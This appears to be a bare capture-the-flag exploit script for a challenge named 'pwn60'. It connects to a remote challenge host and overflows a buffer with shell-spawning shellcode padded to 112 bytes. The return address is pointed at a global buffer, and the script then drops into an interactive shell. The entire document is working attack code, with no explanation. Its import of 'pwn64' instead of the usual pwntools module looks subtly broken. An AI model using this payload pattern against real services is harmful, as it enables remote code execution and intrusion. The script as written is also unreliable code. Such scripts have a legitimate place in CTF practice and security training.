from pwn64 import *
context.log_level = 'debug'
p = remote("pwn.challenge.ctf.show", 28291)
e = ELF("./pwn60")
buf2 = e.sym['buf2']
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(112, b'a') + p32(buf2)
p.sendline(payload)
p.interactive()